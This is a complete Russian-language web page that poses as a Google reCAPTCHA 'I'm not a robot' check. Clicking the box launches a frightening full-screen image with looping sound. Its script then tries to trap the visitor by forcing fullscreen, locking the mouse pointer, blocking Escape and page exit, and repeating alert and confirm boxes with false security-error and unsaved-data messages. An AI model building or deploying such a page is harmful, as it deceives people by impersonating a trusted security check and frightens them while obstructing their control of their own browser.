<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Проверка безопасности</title>
    <style>
        body {
            font-family: Roboto, helvetica, arial, sans-serif;
            background-color: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .captcha-box {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            width: 304px;
            height: 78px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 12px;
            box-shadow: 0 0 4px rgba(0,0,0,0.08);
        }
        .checkbox-container {
            display: flex;
            align-items: center;
        }
        .checkbox {
            width: 28px;
            height: 28px;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            cursor: pointer;
            background: #fff;
            margin-right: 15px;
        }
        .text {
            font-size: 14px;
            color: #282828;
            user-select: none;
        }
        .logo-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 8px;
            color: #555;
        }
        .logo-section img {
            width: 32px;
            height: 32px;
            margin-bottom: 2px;
        }
        
        #screamer-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            z-index: 99999;
        }
        #screamer-container img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <div class="captcha-box">
        <div class="checkbox-container">
            <div class="checkbox" onclick="activateScreamer()"></div>
            <div class="text">Я не робот</div>
        </div>
        <div class="logo-section">
            <img src="https://www.gstatic.com/images/icons/material/product/2x/recaptcha_48dp.png">
            <span>reCAPTCHA</span>
            <a href="https://policies.google.com/privacy" target="_blank" style="color:#555; text-decoration:none; margin-top:2px;">Конфиденциальность</a>
        </div>
    </div>

    <div id="screamer-container">
        <img src="7f3UOH.gif" alt="">
    </div>

    <audio id="screamer-sound" src="caughtyou.mp3" loop preload="auto"></audio>

        <script>
        var isScreamerActive = false;

        function activateScreamer() {
            isScreamerActive = true;
            var container = document.getElementById('screamer-container');
            var sound = document.getElementById('screamer-sound');
            
            container.style.display = 'block';

            // Воспроизведение звука
            sound.play().catch(function(error) {
                console.log("Автовоспроизведение заблокировано браузером");
            });

            // Запрос полноэкранного режима
            if (container.requestFullscreen) {
                container.requestFullscreen();
            } else if (container.webkitRequestFullscreen) { 
                container.webkitRequestFullscreen();
            }

            // Блокировка курсора мыши внутри контейнера
            lockMouse();

            // Бесконечное удержание через alert/confirm при попытке навигации
            window.addEventListener('beforeunload', preventExit);
            
            // Запуск цикла блокировки при кликах или попытках закрытия
            triggerAnnoyingAlerts();
        }

        // Функция блокировки курсора
        function lockMouse() {
            var container = document.getElementById('screamer-container');
            if (container.requestPointerLock) {
                container.requestPointerLock();
            } else if (container.mozRequestPointerLock) {
                container.mozRequestPointerLock();
            }
        }

        // Стандартное предупреждение браузера перед закрытием вкладки
        function preventExit(e) {
            if (!isScreamerActive) return;
            e.preventDefault();
            e.returnValue = 'Изменения не сохранены. Вы уверены, что хотите покинуть страницу?';
            return e.returnValue;
        }

        // Функция, создающая бесконечный цикл модальных окон при клике или Escape
        function triggerAnnoyingAlerts() {
            if (!isScreamerActive) return;
            
            // Бесконечный цикл пока пользователь не нажмет "ОК" в серии окон
            while (true) {
                alert("Ошибка безопасности! Проверка не завершена.");
                var confirmExit = confirm("Изменения не сохранены! Вы уверены, что хотите прервать проверку? Все данные будут утеряны.");
                
                // Если пользователь пытается согласиться или отказаться — возвращаем в цикл
                if (!confirmExit || confirmExit) {
                    alert("Доступ заблокирован. Пожалуйста, завершите проверку «Я не робот».");
                    break; // Прерываем внутренний цикл, но оставляем ловушку на клики
                }
            }
        }

        // Перехват клавиши Escape и других попыток выйти из полноэкранного режима
        window.addEventListener('keydown', function(e) {
            if (isScreamerActive) {
                e.preventDefault();
                lockMouse(); // Возвращаем блокировку мыши
                triggerAnnoyingAlerts();
            }
        });

        // Повторная блокировка мыши и запуск окон при любом клике по экрану
        document.addEventListener('click', function() {
            if (isScreamerActive) {
                var container = document.getElementById('screamer-container');
                
                // Возвращаем полноэкранный режим, если пользователь из него вышел
                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                    if (container.requestFullscreen) container.requestFullscreen();
                    else if (container.webkitRequestFullscreen) container.webkitRequestFullscreen();
                }
                
                lockMouse();
                triggerAnnoyingAlerts();
            }
        });

        // Отслеживание выхода из Pointer Lock (возвращаем его обратно)
        document.addEventListener('pointerlockchange', function() {
            if (isScreamerActive && document.pointerLockElement !== document.getElementById('screamer-container')) {
                setTimeout(lockMouse, 50);
            }
        }, false);
    </script>
</body>
</html>
